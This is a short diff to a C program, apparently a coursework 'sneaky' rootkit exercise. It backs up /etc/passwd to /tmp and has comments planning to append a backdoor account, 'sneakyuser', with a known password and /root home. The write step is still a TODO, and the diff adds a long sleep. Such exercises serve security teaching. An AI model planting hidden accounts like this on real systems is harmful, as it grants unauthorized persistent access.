@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <fcntl.h>
+#include <unistd.h>
 
 int main(void){
 	int myPID = getpid();
@@ -25,12 +26,14 @@ int main(void){
 					//open the /etc/passwd file and print a new line to the end of the file that contains
 					//sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
 					printf("copying passwd file\n");
-					char *cmd1[] = {"cp", "-f", "/etc/passwd", "/tmp/passwd"}; //'cp /etc/passwd /tmp/passwd' cmd
+					char *cmd1[] = {"cp", "-f", "/etc/passwd", "/tmp/passwd", 0}; //'cp /etc/passwd /tmp/passwd' cmd
+					//open("/tmp/passwd", O_RDWR | O_CREAT | S_IRUSR | S_IRGRP | S_IROTH);
 					execvp(cmd1[0], cmd1);
 					exit(0);
 				default:
 					//wrtie new lines to /etc/passwd
 					waitpid(file_mod_pid, NULL, 0);
+					sleep(3000);
 					printf("TODO: write new lines to /etc/passwd\n");
 					int fd;
 					char * abs_path = "/etc/passwd";
